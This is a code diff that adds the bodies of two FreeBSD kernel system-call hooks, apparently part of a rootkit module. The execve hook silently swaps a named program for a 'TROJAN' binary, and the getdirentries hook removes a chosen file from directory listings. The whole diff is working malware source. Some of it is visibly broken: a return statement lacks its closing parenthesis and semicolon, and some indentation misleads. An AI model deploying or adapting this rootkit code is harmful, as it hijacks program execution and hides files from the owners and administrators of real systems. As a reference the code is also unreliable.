@@ -45,9 +45,53 @@ struct module {
 * Redirects the execution of ORIGINAL into TROJAN.
 */
 static int
-execve_hook(struct thread *td, void *syscall_args)
-{
-. . .
+execve_hook(struct thread *td, void *syscall_args) {
+
+    struct execve_args /* {
+        char *fname;
+        char **argv;
+        char **envv;
+     } */ *uap;
+     uap = (struct execve_args *)syscall_args;
+     struct execve_args kernel_ea;
+     struct execve_args *user_ea;
+     struct vmspace *vm;
+     vm_offset_t base, addr;
+     char t_fname[] = TROJAN;
+ /* Redirect this process? */
+     if (strcmp(uap->fname, ORIGINAL) == 0) {
+ /*
+ * Determine the end boundary address of the current
+ * process's user data space.
+ */
+         vm = curthread->td_proc->p_vmspace;
+         base = round_page((vm_offset_t) vm->vm_daddr);
+         addr = base + ctob(vm->vm_dsize);
+ /*
+ * Allocate a PAGE_SIZE null region of memory for a new set
+ * of execve arguments.
+ */
+        vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,
+        VM_PROT_ALL, VM_PROT_ALL, 0);
+        vm->vm_dsize += btoc(PAGE_SIZE);
+ /*
+ * Set up an execve_args structure for TROJAN. Remember, you
+ * have to place this structure into user space, and because
+ * you can't point to an element in kernel space once you are
+ * in user space, you'll have to place any new "arrays" that
+ * this structure points to in user space as well.
+ */
+         copyout(&t_fname, (char *)addr, strlen(t_fname));
+         kernel_ea.fname = (char *)addr;
+         kernel_ea.argv = uap->argv;
+         kernel_ea.envv = uap->envv;
+ /* Copy out the TROJAN execve_args structure. */
+         user_ea = (struct execve_args *)addr + sizeof(t_fname);
+         copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
+ /* Execute TROJAN. */
+         return(execve(curthread, user_ea)
+     }
+     return(execve(td, syscall_args));
 }
 /*
 * getdirentries system call hook.
@@ -56,7 +100,63 @@ execve_hook(struct thread *td, void *syscall_args)
 static int
 getdirentries_hook(struct thread *td, void *syscall_args)
 {
-. . .
+    struct getdirentries_args /* {
+        int fd;
+        char *buf;
+        u_int count;
+        long *basep;
+     } */ *uap;
+     uap = (struct getdirentries_args *)syscall_args;
+     struct dirent *dp, *current;
+     unsigned int size, count;
+ /*
+ * Store the directory entries found in fd in buf, and record the
+ * number of bytes actually transferred.
+ */
+     getdirentries(td, syscall_args);
+     size = td->td_retval[0];
+ /* Does fd actually contain any directory entries? */
+     if (size > 0) {
+         MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
+         copyin(uap->buf, dp, size);
+         current = dp;
+         count = size;
+ /*
+ * Iterate through the directory entries found in fd.
+ * Note: The last directory entry always has a record length
+ * of zero.
+ */
+        while ((current->d_reclen != 0) && (count > 0)) {
+            count -= current->d_reclen;
+ /* Do we want to hide this file? */
+            if(strcmp((char *)&(current->d_name), T_NAME) == 0) {
+ /*
+ * Copy every directory entry found after
+ * T_NAME over T_NAME, effectively cutting it
+ * out.
+ */
+                if (count != 0)
+                    bcopy((char *)current +current->d_reclen, current,count);
+                    size -= current->d_reclen;
+                    break;
+            }
+ /*
+ * Are there still more directory entries to
+ * look through?
+ */
+            if (count != 0)
+ /* Advance to the next record. */
+                current = (struct dirent *)((char *)current + current->d_reclen);
+        }
+ /*
+ * If T_NAME was found in fd, adjust the "return values" to
+ * hide it. If T_NAME wasn't found...don't worry 'bout it.
+ */
+     td->td_retval[0] = size;
+     copyout(dp, uap->buf, size);
+     FREE(dp, M_TEMP);
+     }
+ return(0);
 }
 /* The function called at load/unload. */
 static int
